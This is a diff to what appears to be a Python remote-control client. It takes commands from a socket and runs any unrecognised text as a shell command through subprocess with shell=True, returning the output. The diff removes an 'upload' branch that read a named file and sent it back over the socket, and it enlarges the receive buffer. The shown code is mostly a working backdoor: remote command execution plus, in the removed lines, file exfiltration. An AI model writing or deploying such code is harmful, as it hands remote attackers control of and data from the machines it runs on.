@@ -56,22 +56,13 @@ def parse_commands(data):
             return "File Created: " + filename + "_backup" + "\n"
         except Exception as e:
             return "Error reading file: " + str(e) + "\n"
-    elif data[:6].decode("utf-8") == "upload":
-            try:
-                filename = data[7:].decode("utf-8").strip('"')
-                with open(filename, "rb") as f:
-                    file_data = f.read()
-                    s.sendall(file_data)
-                    return "Uploaded: " + filename + "\n"
-            except Exception as e:
-                return "Error uploading file: " + str(e) + "\n"
     else:
         cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_byte,"utf-8")
         return output_str
 while True:
-    data = s.recv(1024)
+    data = s.recv(4096)
     if not data:
         s.send(str.encode("No data received"))
         break
